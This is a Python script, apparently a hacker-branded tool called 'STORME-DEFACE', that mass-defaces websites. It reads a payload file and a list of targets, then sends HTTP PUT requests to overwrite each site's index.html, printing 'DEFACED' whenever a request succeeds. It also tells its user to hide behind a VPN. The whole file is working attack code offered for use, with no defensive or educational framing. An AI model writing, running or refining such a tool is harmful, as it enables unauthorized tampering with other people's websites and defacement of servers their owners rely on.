#-*- coding: utf-8 -*-
# STORME-DEFACE V1.0 | @18shinstorme | KEY: stormeshin18

import requests
import os.path
import sys
import time
import random

banner = f"""
             ___
           /  >  フ   
          /   _  _|    Author : @18shinstorme (STORME-DEFACE)
        /`   ミ_x/      Date   : {time.strftime("%m-%d-%Y")}
     _//        |      Tools  : STORME-DEFACE V1.0
    /  ヽ       ﾉ       Key    : stormeshin18
    │     | | |
  ／￣\   | | |  
  | (￣ヽ＿ヽ)_)
   ＼二つ
"""

red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
reset = "\033[0m"

def storme_input(prompt):
    return input(prompt) if sys.version_info.major > 2 else raw_input(prompt)

def deface_attack(script_path, target_file="targets.txt"):
    try:
        with open(script_path, "r") as f:
            payload = f.read()
        
        with open(target_file, "r") as f:
            targets = f.readlines()
        
        session = requests.Session()
        print(f"{yellow}🔥 Attacking {len(targets)} websites...{reset}")
        
        for site in targets:
            site = site.strip()
            if not site.startswith(("http://", "https://")):
                site = "http://" + site
            
            try:
                response = session.put(site + "/index.html", data=payload)
                if 200 <= response.status_code < 300:
                    print(f"{green}[✔] DEFACED -> {site}{reset}")
                else:
                    print(f"{red}[✘] FAILED -> {site}{reset}")
            except:
                print(f"{red}[✘] ERROR -> {site}{reset}")
    except Exception as e:
        print(f"{red}ERROR: {str(e)}{reset}")

def main():
    print(banner)
    print(f"{yellow}⚠️ WARNING: Use a VPN!{reset}\n")
    
    while True:
        script = storme_input(f"{red}⚡ STORME-DEFACE{reset} {yellow}Enter script path (e.g., 'index.html'): {reset}")
        if os.path.isfile(script):
            break
        print(f"{red}File not found! Try again.{reset}")
    
    deface_attack(script)

if __name__ == "__main__":
    main()